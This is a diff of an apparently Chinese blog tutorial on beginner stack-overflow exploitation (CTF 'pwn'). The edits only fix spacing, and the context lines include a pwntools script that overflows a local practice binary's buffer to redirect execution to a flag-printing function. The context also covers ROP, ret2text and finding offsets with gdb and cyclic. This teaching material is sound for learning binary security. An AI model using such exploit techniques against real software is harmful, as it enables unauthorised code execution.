@@ -1326,10 +1326,10 @@ index.php</p>
 <img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/%25%29_I4VHXY%40W%29%29O%60%40_DMU%5DPK.png" alt=""><br>
 双击<code>char s</code>，可以看到栈空间大小为<code>0x14</code>，到函数的返回值为<code>0x4-(-0x14)=0x18</code>，也就是只需要18个字节，我们就可以覆盖返回地址的内容。<br>
 <img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/E%5DSFORK4P1NSS%7D__O%28_Q%2533.png" alt=""><br>
-我们知道函数的调用过程是，当子函数执行完毕，就会把主函数下一个命令的地址出栈并赋值给 EIP 寄存器，随后 EIP 寄存器就会去该地址执行。而我们在ida中可以看到含有 flag 的 <strong>success</strong>函数地址为<code>0x08048456</code>，所以我们exp如下</p>
+我们知道函数的调用过程是，当子函数执行完毕，就会把主函数下一个命令的地址出栈并赋值给 EIP 寄存器，随后 EIP 寄存器就会去该地址执行。而我们在ida中可以看到含有 flag 的 <strong>success</strong> 函数地址为<code>0x08048456</code>，所以我们exp如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./stack1&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p32(<span class="number">0x08048456</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/%286AY1M%29%289_F%2490_0CM091HX.png" alt=""></p>
-<p>成功执行 <strong>success</strong>函数获取到flag</p>
+<p>成功执行 <strong>success</strong> 函数获取到flag</p>
 <h2 id="基本ROP"><a class="header-anchor" href="#基本ROP">¶</a>基本ROP</h2>
 <blockquote>
 <p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在 <strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong> 所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
@@ -1357,8 +1357,7 @@ index.php</p>
 <img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/0P19P_C1Y%40RIV2%60F%40BVPG4G.png" alt=""><br>
 其地址为<code>0x0804863A</code>，接着就是计算 s 相对于返回地址的偏移，首先打开 gdb 运行文件</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb ret2text</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/60TFV9HH%5DGCNT8H1%24DO%249UB.png" alt=""></p>
-<p>接着另起一个窗口使用 cyclic 工具生成字符，比如这里生成150的字符</p>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/60TFV9HH%5DGCNT8H1%24DO%249UB.png" alt="">接着另起一个窗口使用 cyclic 工具生成字符，比如这里生成150的字符</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cyclic 150</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/9CXS85B9OPKNQTQEW30X7RD.png" alt=""><br>
 然后放到gdb中回车<br>
